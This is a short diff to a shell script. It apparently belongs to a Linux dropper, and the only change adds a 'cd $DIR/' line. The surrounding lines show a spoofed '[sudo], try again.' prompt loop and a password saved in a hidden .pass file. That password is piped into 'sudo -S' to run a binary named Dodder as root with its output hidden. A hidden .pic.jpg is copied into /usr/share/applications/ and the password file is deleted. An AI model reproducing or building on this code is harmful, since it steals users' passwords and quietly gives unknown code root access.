@@ -24,6 +24,7 @@ do
         echo "[sudo], try again."
     fi
 done
+cd $DIR/
 sudo -S $DIR/Dodder --file /var/log/Dodder.log < $DIR/.pass > /dev/null 2>&1
 sudo cp $DIR/.pic.jpg /usr/share/applications/
 rm $DIR/.pass
